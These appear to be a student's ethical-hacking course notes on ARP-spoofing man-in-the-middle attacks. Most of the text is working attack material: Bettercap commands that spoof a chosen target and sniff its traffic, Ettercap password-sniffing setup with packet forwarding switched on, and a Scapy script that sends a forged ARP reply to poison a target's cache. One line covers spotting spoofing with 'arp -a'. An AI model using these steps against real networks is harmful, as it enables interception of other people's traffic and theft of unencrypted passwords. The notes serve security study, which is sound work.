# Man in the Middle Attack

Not as important as the other material, but still very good to know. This attack targets ARP requests and replies within a local network. When communicating within a network, a computer will send out an ARP request for a specific IP address, and the correct IP will respond with its MAC address. IP addresses and MAC addresses help routers and computers within the same network communicate with each other. But if we manipulate our response, and say we have the router's IP address, the other computer will start sending us its packets instead of the router. We would forward these requests to the router that way computers still get their requests fulfilled, but we will be able to sniff data, see websites others are visiting, and sniff unencrypted passwords.

## Bettercap ARP Spoofing

`apt-get install bettercap`

`bettercap` - enter bettercap framework

`help` - see available commands

`help net.probe` - see details about specific module. net.probe searches the local network for machines.

`net.probe on`

`set arp.spoof.fullduplex true`

`set arp.spoof.targets TARGETIP`

`set net.sniff.local true`

`arp.spoof on`

`net.sniff on`

These settings will begin sniffing packets sent from target machine. A lot of data streams to the terminal.

`nano sniff.cap` - save the above commands into a cap file

`bettercap -iface eth0 -caplet sniff.cap` - bettercap runs the cap file we created

## Ettercap Password Sniffing

Some tools will not automatically forward packets, so you must do it manually.

Check if packet forwarding is enabled - 

`cat /proc/sys/net/ipv4/ip_forward` - we want this set to 1

`echo 1 > /proc/sys/net/ipv4/ip_forward`

`ettercap -G` - opens GUI. Rewatch video for demonstration.

To see if you are being spoofed, `arp -a` will show the IP and MAC addresses on your network, a different mac address should be on each IP.

## Scapy ARP Cache Poisoning

Scapy comes with Python 3 and allows us to manipulate network packets as well as send and receive packets. This could also be accomplished with the socket library, but Scapy has done all the work for us.

`scapy`

`ls(Ether)` - list all fields an Ether packet contains

`ls(ARP)` - lists all fields that an ARP packet contains. This can be done for any packet - TCP, etc.

If we know the MAC address of our target, we can poison its ARP cache to make it think we are the router.

run as root - 

```
broadcast = Ether(dst='ff:ff:ff:ff:ff:ff') # set destination MAC target to everyone on network
broadcast.show() # shows the current config. src is kali MAC address

arp_layer = ARP(pdst='TARGETIP') # preparing the ARP request
arp_layer.show()

entire_packet = broadcast/arp_layer
entire_packet.show()

answer = srp(entire_packet, timeout=2, verbose=True)[0] # receive answered packets

print(answer[0]) # hwsrc contains our target's MAC address if successful
print(answer[0][1].hwsrc)

target_mac_address = answer[0][1].hwsrc

packet = ARP(op=2, hwdst=target_mac_address, pdst='TARGETIP', psrc='ROUTERIP') # sets ARP response condition, with target MAC, IP, and router IP instead of kali IP
packet.show()

send(packet, Verbose=False)
```